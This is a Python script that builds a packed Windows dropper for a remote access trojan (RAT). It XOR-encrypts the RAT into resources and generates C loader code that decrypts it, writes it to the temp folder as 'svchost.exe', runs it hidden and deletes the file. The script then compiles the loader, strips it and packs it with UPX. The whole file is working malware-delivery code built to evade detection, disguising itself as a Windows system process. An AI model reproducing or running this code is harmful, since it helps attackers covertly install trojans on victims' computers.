import os
import sys
import subprocess
import random
import string
import zlib

def generate_random_name():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def build_single_exe_with_dll(exe_path):
    print("=" * 60)
    print("SINGLE EXE WITH EMBEDDED DLL (BINARY)")
    print("=" * 60)
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        return None
    
    output_dir = os.path.dirname(exe_path)
    
    print("Reading RAT EXE...")
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"RAT size: {len(exe_data) / (1024*1024):.1f} MB")
    
    print("Compressing...")
    compressed = zlib.compress(exe_data, level=9)
    
    print("Encrypting...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(compressed):
        encrypted.append(byte ^ key[i % len(key)])
    
    # Save as binary files
    rat_bin = os.path.join(output_dir, 'rat.bin')
    with open(rat_bin, 'wb') as f:
        f.write(encrypted)
    
    key_bin = os.path.join(output_dir, 'key.bin')
    with open(key_bin, 'wb') as f:
        f.write(key)
    
    print("Creating resource file...")
    
    # Resource file
    rc_content = '''
#include <windows.h>
IDR_RAT_DATA RCDATA "rat.bin"
IDR_RAT_KEY RCDATA "key.bin"
'''
    
    rc_file = os.path.join(output_dir, 'resource.rc')
    with open(rc_file, 'w', encoding='utf-8') as f:
        f.write(rc_content)
    
    dll_name = f"system_{generate_random_name()}.dll"
    
    print("Creating EXE with embedded DLL...")
    
    loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

#define IDR_RAT_DATA 101
#define IDR_RAT_KEY 102

void xor_decrypt(unsigned char* data, int len, unsigned char* key, int key_len) {{
    for(int i = 0; i < len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

void run_rat() {{
    HMODULE hModule = GetModuleHandleA(NULL);
    
    // Get encrypted data
    HRSRC hResData = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_DATA), "RCDATA");
    if (!hResData) return;
    
    HGLOBAL hData = LoadResource(hModule, hResData);
    if (!hData) return;
    
    DWORD data_size = SizeofResource(hModule, hResData);
    unsigned char* enc_data = (unsigned char*)LockResource(hData);
    
    // Get key
    HRSRC hResKey = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_KEY), "RCDATA");
    if (!hResKey) return;
    
    HGLOBAL hKey = LoadResource(hModule, hResKey);
    if (!hKey) return;
    
    DWORD key_size = SizeofResource(hModule, hResKey);
    unsigned char* key_data = (unsigned char*)LockResource(hKey);
    
    // Decrypt
    unsigned char* decrypted = (unsigned char*)malloc(data_size);
    if (!decrypted) return;
    memcpy(decrypted, enc_data, data_size);
    xor_decrypt(decrypted, data_size, key_data, key_size);
    
    // Temp file
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    strcat(temp, "svchost.exe");
    
    HANDLE h = CreateFileA(temp, GENERIC_WRITE, 0, NULL,
                          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {{
        DWORD w;
        WriteFile(h, decrypted, data_size, &w, NULL);
        CloseHandle(h);
        
        STARTUPINFOA si = {{sizeof(si)}};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(temp, NULL, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(3000);
        DeleteFileA(temp);
    }}
    free(decrypted);
}}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run_rat, NULL, 0, NULL);
    }}
    return TRUE;
}}

int main() {{
    DllMain(GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, NULL);
    while(1) Sleep(1000);
    return 0;
}}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling with resources...")
    loader_exe = os.path.join(output_dir, 'svchost_final.exe')
    
    # Compile resource
    res_obj = os.path.join(output_dir, 'resource.o')
    subprocess.run(['windres', '-i', rc_file, '-o', res_obj], capture_output=True)
    
    # Compile EXE
    cmd = [
        'gcc',
        loader_src,
        res_obj,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
    except Exception as e:
        print(f"Compilation failed: {e}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True)
    except:
        pass
    
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Size: {final_size:.2f} MB")
    print("=" * 60)
    
    # Cleanup
    try:
        os.remove(rc_file)
        os.remove(res_obj)
        os.remove(rat_bin)
        os.remove(key_bin)
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/rat_temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_single_exe_with_dll(exe_path)
